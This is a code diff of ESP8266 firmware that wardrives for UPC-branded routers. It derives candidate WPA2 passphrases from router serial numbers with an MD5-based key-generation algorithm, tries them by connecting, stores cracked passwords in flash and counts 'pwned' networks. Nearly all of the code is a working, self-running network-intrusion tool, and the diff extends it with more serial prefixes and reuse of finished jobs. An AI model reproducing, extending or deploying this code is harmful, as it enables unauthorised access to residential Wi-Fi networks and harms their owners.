@@ -24,6 +24,7 @@ typedef struct {
     size_t current_password;
     size_t passwords_found;
     bool finished_cracking;
+    uint32_t start_buf[3];
 } crack_job_t;
 
 typedef struct {
@@ -33,12 +34,15 @@ typedef struct {
     crack_job_t *job;
 } ap_t;
 
-size_t aps_found;
-ap_t aps[MAX_APS];
+static size_t aps_found;
+static ap_t aps[MAX_APS];
 
-crack_job_t * crack_jobs[MAX_JOBS] = {0};
-size_t jobs_active;
-size_t last_job = 0;
+static crack_job_t * crack_jobs[MAX_CRACK_JOBS] = {0};
+static crack_job_t * finished_jobs[MAX_SAVED_RESULTS] = {0};
+static size_t jobs_active;
+static size_t jobs_finished = 0;
+static size_t last_active_job = 0;
+static size_t last_finished_job = 0;
 
 #ifdef MODE_HEADLESS
 #define printf(...)
@@ -79,7 +83,8 @@ static void load_password(size_t ap_index){
     } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
 }
 
-void randomize_mac_addr(void){
+ICACHE_FLASH_ATTR
+static void randomize_mac_addr(void){
     char mac[6];
     os_get_random(mac, 6);
     printf("Setting MAC address to: %02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
@@ -95,51 +100,54 @@ enum {
 
 size_t ap_timeouts;
 static void crack(os_event_t *events);
-static void targets_found(void* arg, STATUS status);
+static void wifi_scan_cb(void* arg, STATUS status);
 
 #define user_procTaskQueueLen 1
 os_event_t user_procTaskQueue[user_procTaskQueueLen];
 
 size_t global_ap_to_test;
 static volatile os_timer_t blink_timer;
+static uint32_t buf[3] = {0, 0, 0};
 
-void add_cracker_job(crack_job_t *job){
+ICACHE_FLASH_ATTR
+static void add_cracker_job(crack_job_t *job){
     printf("Adding cracker job...");
-    size_t i;
-    for(i = 0; i < MAX_JOBS; i++){
-        if(!crack_jobs[i]){
-            crack_jobs[i] = aps[aps_found].job;
-            i++;
-            printf(" in slot %u", i);
+    size_t job_idx;
+    for(job_idx = 0; job_idx < MAX_CRACK_JOBS; job_idx++){
+        if(!crack_jobs[job_idx]){
+            crack_jobs[job_idx] = job;
+            job_idx++;
+            printf(" in slot %u", job_idx);
             jobs_active++;
             break;
         }
     }
-    if(i > last_job){
-        last_job = i;
+    if(job_idx > last_active_job){
+        last_active_job = job_idx;
     }
-    if(last_job == 1){
+    if(last_active_job == 1){
         // re-start cracker
         system_os_post(PRIO_CRACK, 0, 0 );
     }
-    printf("/%u\n", last_job);
-    if(i == MAX_JOBS){
+    printf("/%u\n", last_active_job);
+    if(job_idx == MAX_CRACK_JOBS){
         printf("Crack jobs list full!\n");
     }
 }
 
-void delete_cracker_job(crack_job_t *job){
-    size_t jobs;
+ICACHE_FLASH_ATTR
+static void delete_cracker_job(crack_job_t *job){
+    size_t jobs_idx;
     printf("Deleting cracker job...");
     if(job){
-        for(jobs = 0; jobs < last_job; jobs++){
-            if(crack_jobs[jobs] == job){
-                printf(" from slot %u", jobs+1);
-                printf("/%u\n", last_job);
-                last_job--;
+        for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
+            if(crack_jobs[jobs_idx] == job){
+                printf(" from slot %u", jobs_idx+1);
+                printf("/%u\n", last_active_job);
+                last_active_job--;
                 // re-organise job pointers
-                crack_jobs[jobs] = crack_jobs[last_job];
-                crack_jobs[last_job] = NULL;
+                crack_jobs[jobs_idx] = crack_jobs[last_active_job];
+                crack_jobs[last_active_job] = NULL;
                 jobs_active--;
                 break;
             }
@@ -147,7 +155,28 @@ void delete_cracker_job(crack_job_t *job){
     }
 }
 
-void blink(void *arg){
+ICACHE_FLASH_ATTR
+static void delete_finished_job(crack_job_t *job){
+    size_t jobs_idx;
+    printf("Deleting finished cracker job...");
+    if(job){
+        for(jobs_idx = 0; jobs_idx < last_finished_job; jobs_idx++){
+            if(finished_jobs[jobs_idx] == job){
+                printf(" from slot %u", jobs_idx+1);
+                printf("/%u\n", last_finished_job);
+                last_finished_job--;
+                // re-organise job pointers
+                finished_jobs[jobs_idx] = finished_jobs[last_finished_job];
+                finished_jobs[last_finished_job] = NULL;
+                jobs_finished--;
+                break;
+            }
+        }
+    }
+}
+
+ICACHE_FLASH_ATTR
+static void blink(void *arg){
   if (GPIO_REG_READ(GPIO_OUT_ADDRESS) & (1 << LED_PIN)){
     GPIO_OUTPUT_SET(LED_PIN, 0);
   } else {
@@ -155,40 +184,50 @@ void blink(void *arg){
   }
 }
 
+ICACHE_FLASH_ATTR
+static void free_job(crack_job_t * job){
+    if(job){
+        delete_finished_job(job);
+        os_free(job->candidate_passwords);
+        os_free(job);
+    }
+}
+
+static size_t total_aps_pwned = 0;
 
 ICACHE_FLASH_ATTR
-static void
-wifi(os_event_t *events){
+static void wifi(os_event_t *events){
     if(state == SCANNING){
         if(aps_found == MAX_APS){
-            printf("Flushing AP buffer...\n");
             // flush AP buffer (found passwords will be re-loaded from flash, jobs will be re-linked by their target id)
+            printf("Flushing AP buffer...\n");
             aps_found = 0;
             memset(aps, 0x0, sizeof(aps));
         }
+        size_t aps_targeted = 0;
         size_t i;
         for(i = 0; i < MAX_APS; i++){
-            if(strlen(aps[i].password) == 8){
-                printf("Cracked | AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (password: %s )\n", aps[i].bssid[0], aps[i].bssid[1], aps[i].bssid[2], aps[i].bssid[3], aps[i].bssid[4], aps[i].bssid[5], aps[i].essid, aps[i].password);
-            }
-
             if(aps[i].job){
                 if(aps[i].job->finished_cracking && aps[i].job->current_password >= aps[i].job->passwords_found){
                     printf("Finished testing passwords for ESSID %s\n", aps[i].essid);
                     memcpy(aps[i].password, "UNKNOWN", 7);
                     aps[i].password[7] = 0;
-                    if(aps[i].job){
-                        delete_cracker_job(aps[i].job);
-                        os_free(aps[i].job->candidate_passwords);
-                        os_free(aps[i].job);
-                        aps[i].job = NULL;
-                    }
+                    free_job(aps[i].job);
+                    aps[i].job = NULL;
                     save_password(i);
                 }
             }
+            if(aps[i].job){
+                aps_targeted++;
+            }
+            if(strlen(aps[i].password) == 8){
+                printf("Cracked | AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (password: %s )\n", aps[i].bssid[0], aps[i].bssid[1], aps[i].bssid[2], aps[i].bssid[3], aps[i].bssid[4], aps[i].bssid[5], aps[i].essid, aps[i].password);
+            }
         }
+        /*system_print_meminfo();*/
+        printf("%u new vulnerable, %u target(s) in cache, %u still being cracked, %u bytes free\n", total_aps_pwned, aps_targeted, jobs_active, system_get_free_heap_size());
         state = TARGETING;
-        wifi_station_scan(NULL, targets_found);
+        wifi_station_scan(NULL, wifi_scan_cb);
     } else if(state == CONNECTING || state == DISCONNECTING){
 
         if(ap_timeouts == MAX_TRIES){
@@ -248,7 +287,9 @@ wifi(os_event_t *events){
                     printf("Saved password to user flash\n");
                     os_timer_arm(&blink_timer, 50, 1);
                     delete_cracker_job(aps[global_ap_to_test].job);
+                    free_job(aps[global_ap_to_test].job);
                     aps[global_ap_to_test].job = NULL;
+                    total_aps_pwned++;
                     // no need to test more
                     state = DISCONNECTING;
                     break;
@@ -259,55 +300,87 @@ wifi(os_event_t *events){
     }
 }
 
-// callback for scan
+// callback for wifi
 ICACHE_FLASH_ATTR
-static void
-targets_found(void* arg, STATUS status){
+static void wifi_scan_cb(void* arg, STATUS status){
     struct bss_info *bss_link = (struct bss_info *)arg;
     int8_t best_link = MIN_STRENGTH;
     size_t i;
     size_t ap_to_test = -1;
+    // search through the buffer of aps to see if this is a new one, if so add it to the buffer
     while (bss_link != NULL){
-        bool found = false;
+        bool found_ap = false;
         for(i = 0; i < aps_found; i++){
             if(strncmp(aps[i].essid, bss_link->ssid, 32) == 0){
-                found = true;
-                printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
-                if(aps[i].password[0]){
-                    printf(" (password: %s )", aps[i].password);
-                } else if(aps[i].job){
-                    printf(" [TARGETED %u/%u]", aps[i].job->current_password, aps[i].job->passwords_found);
-                    if(aps[i].job->current_password < aps[i].job->passwords_found && bss_link->rssi > best_link){
-                        best_link = bss_link->rssi;
-                        ap_to_test = i;
-                    }
-                }
-                printf("\n");
+                found_ap = true;
+                break;
             }
         }
-        if(!found && aps_found < MAX_APS){
-            printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
-            memcpy(aps[aps_found].bssid, bss_link->bssid, 6);
-            memcpy(aps[aps_found].essid, bss_link->ssid, 32);
+        if(!found_ap){
+            if(aps_found < MAX_APS){
+                printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB, CH%02u)\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi, bss_link->channel);
+                memcpy(aps[aps_found].bssid, bss_link->bssid, 6);
+                memcpy(aps[aps_found].essid, bss_link->ssid, 32);
 
-            load_password(aps_found);
-            if(!aps[aps_found].password[0]){
-                if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
-                    aps[aps_found].job = os_zalloc(sizeof(crack_job_t));
-                    for(i = 3; i < 10; i++){
-                        aps[aps_found].job->target *= 10;
-                        aps[aps_found].job->target += aps[aps_found].essid[i]-0x30;
+                load_password(aps_found);
+                if(!aps[aps_found].password[0]){
+                    if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
+                        uint32_t target = 0;
+                        for(i = 3; i < 10; i++){
+                            target *= 10;
+                            target += aps[aps_found].essid[i]-0x30;
+                        }
+                        bool found_target = false;
+                        for(i = 0; i < MAX_CRACK_JOBS; i++){
+                            if(crack_jobs[i]){
+                                if(crack_jobs[i]->target == target){
+                                    aps[aps_found].job = crack_jobs[i];
+                                    found_target = true;
+                                    break;
+                                }
+                            }
+                        }
+                        for(i = 0; i < MAX_SAVED_RESULTS; i++){
+                            if(finished_jobs[i]){
+                                if(finished_jobs[i]->target == target){
+                                    aps[aps_found].job = finished_jobs[i];
+                                    found_target = true;
+                                    break;
+                                }
+                            }
+                        }
+                        if(!found_target){
+                            aps[aps_found].job = os_zalloc(sizeof(crack_job_t));
+                            if(aps[aps_found].job){
+                                aps[aps_found].job->target = target;
+                                memcpy(aps[aps_found].job->start_buf, buf, sizeof(buf));
+                                add_cracker_job(aps[aps_found].job);
+                            } else {
+                                printf("Malloc error! Heap full?\n");
+                            }
+                        }
                     }
-                    add_cracker_job(aps[aps_found].job);
+                }
+                aps_found++;
+            }
+        } else {
+            printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB, CH%02u)", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi, bss_link->channel);
+            if(aps[i].password[0]){
+                printf(" (password: %s )", aps[i].password);
+            } else if(aps[i].job){
+                printf(" [TARGETED %u/%u]", aps[i].job->current_password, aps[i].job->passwords_found);
+                if(aps[i].job->current_password < aps[i].job->passwords_found && bss_link->rssi > best_link){
+                    best_link = bss_link->rssi;
+                    ap_to_test = i;
                 }
             }
-            aps_found++;
+            printf("\n");
         }
 
         bss_link = bss_link->next.stqe_next;
     }
     if(ap_to_test != -1){
-        printf("Connecting to ESSID %s...\n", aps[ap_to_test].essid);
+        //printf("Connecting to ESSID %s...\n", aps[ap_to_test].essid);
         os_timer_disarm(&blink_timer);
         GPIO_OUTPUT_SET(LED_PIN, 0);
         state = CONNECTING;
@@ -325,6 +398,9 @@ targets_found(void* arg, STATUS status){
 
 ICACHE_FLASH_ATTR
 void user_init(){
+    // go at full speed
+    system_update_cpu_freq(SYS_CPU_160MHZ);
+
     // set up LED
     gpio_init();
     GPIO_OUTPUT_SET(LED_PIN, 1);
@@ -337,7 +413,7 @@ void user_init(){
     os_delay_us(100);
 #endif
 
-
+    // set up networking
     wifi_set_opmode(STATION_MODE);
     wifi_station_set_auto_connect(false);
     wifi_station_dhcpc_stop();
@@ -348,8 +424,6 @@ void user_init(){
     info.netmask.addr = ipaddr_addr("255.255.255.0");
     info.gw.addr = ipaddr_addr("192.168.1.1");
     wifi_set_ip_info(STATION_IF, &info);
-
-    system_update_cpu_freq(SYS_CPU_160MHZ);
 
     // set up tasks
     system_os_task(wifi, PRIO_WIFI, user_procTaskQueue, user_procTaskQueueLen);
@@ -398,6 +472,7 @@ int (*MD5_Final)(unsigned char *md, MD5_CTX *c) = 0x40009900;
 #define MAX2 6800
 
 ICACHE_FLASH_ATTR
+static
 void hash2pass(uint8_t *in_hash, char *out_pass)
 {
 	uint32_t i, a;
@@ -419,6 +494,7 @@ void hash2pass(uint8_t *in_hash, char *out_pass)
 
 
 ICACHE_FLASH_ATTR
+static
 uint32_t mangle(uint32_t *pp)
 {
 	uint32_t a, b;
@@ -437,18 +513,47 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
     return a - (((a * MAGIC2) >> 54) - (a >> 31)) * 10000000;
 }
 
-uint32_t buf[3] = {0, 0, 0};
+ICACHE_FLASH_ATTR
+static void serial2pass(char* serial, char* pass){
+    uint8_t h1[16], h2[16];
+    uint32_t hv[4], w1, w2, i;
+    char tmpstr[17];
+    MD5_CTX ctx;
+    MD5_Init(&ctx);
+    MD5_Update(&ctx, serial, strlen(serial));
+    MD5_Final(h1, &ctx);
+
+    for (i = 0; i < 4; i++) {
+        hv[i] = *(uint16_t *)(h1 + i*2);
+    }
+
+    w1 = mangle(hv);
+
+    for (i = 0; i < 4; i++) {
+        hv[i] = *(uint16_t *)(h1 + 8 + i*2);
+    }
+
+    w2 = mangle(hv);
+
+    os_sprintf(tmpstr, "%08X%08X", w1, w2);
+
+    MD5_Init(&ctx);
+    MD5_Update(&ctx, tmpstr, strlen(tmpstr));
+    MD5_Final(h2, &ctx);
+
+    hash2pass(h2, pass);
+}
+
 __attribute((optimize("O3")))
 ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
-    if(!last_job){
+    if(!last_active_job){
         return;
     }
-    size_t jobs;
+    size_t jobs_idx;
     crack_job_t *job;
-    for(jobs = 0; jobs < last_job; jobs++){
-        system_soft_wdt_feed();
-        job = crack_jobs[jobs];
+    for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
+        job = crack_jobs[jobs_idx];
         if(!job){
             continue;
         }
@@ -456,44 +561,14 @@ static void crack(os_event_t *events){
             continue;
 
         char serial[64];
-        char pass[9], tmpstr[17];
-        uint8_t h1[16], h2[16];
-        uint32_t hv[4], w1, w2, i;
-        MD5_CTX ctx;
+        char pass[9];
 
-        os_sprintf(serial, "SAAP%d%03d%d", buf[0], buf[1], buf[2]);
+        uint8_t *prefix[3] = {"SAAP", "SAPP", "SBAP"};
+        size_t prefix_idx;
 
-        MD5_Init(&ctx);
-        MD5_Update(&ctx, serial, strlen(serial));
-        MD5_Final(h1, &ctx);
-
-        for (i = 0; i < 4; i++) {
-            hv[i] = *(uint16_t *)(h1 + i*2);
-        }
-
-        w1 = mangle(hv);
-
-        for (i = 0; i < 4; i++) {
-            hv[i] = *(uint16_t *)(h1 + 8 + i*2);
-        }
-
-        w2 = mangle(hv);
-
-        os_sprintf(tmpstr, "%08X%08X", w1, w2);
-
-        MD5_Init(&ctx);
-        MD5_Update(&ctx, tmpstr, strlen(tmpstr));
-        MD5_Final(h2, &ctx);
-
-        hash2pass(h2, pass);
-        for(i = 0; i < job->passwords_found; i++){
-            if(memcmp(pass, job->candidate_passwords+(i*8), 8) == 0){
-                // job will be freed after testing
-                job->finished_cracking = true;
-                break;
-            }
-        }
-        if(!job->finished_cracking){
+        for(prefix_idx = 0; prefix_idx < 3; prefix_idx++){
+            os_sprintf(serial, "%s%d%03d%d", prefix[prefix_idx], buf[0], buf[1], buf[2]);
+            serial2pass(serial, pass);
             printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
 
             job->passwords_found++;
@@ -504,9 +579,6 @@ static void crack(os_event_t *events){
                 job->candidate_passwords = os_zalloc(required_size);
             }
             memcpy(job->candidate_passwords+(8*(job->passwords_found-1)), pass, 8);
-        } else {
-            printf("Finished generating passwords for target UPC%07d\n", job->target);
-            delete_cracker_job(job);
         }
     }
 
@@ -517,13 +589,22 @@ static void crack(os_event_t *events){
     }
     if(buf[1] == MAX1+1){
         buf[1] = 0;
-        printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0], MAX0);
+        /*printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0], MAX0);*/
         buf[0]++;
     }
     if(buf[0] == MAX0+1){
         buf[0] = 0;
         buf[1] = 0;
         buf[2] = 0;
+    }
+    for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
+        if(memcmp(job->start_buf, buf, sizeof(buf)) == 0){
+            printf("Finished generating passwords for target UPC%07d\n", job->target);
+            delete_cracker_job(job);
+            finished_jobs[jobs_finished] = job;
+            jobs_finished++;
+            break;
+        }
     }
 
     system_os_post(PRIO_CRACK, 0, 0);
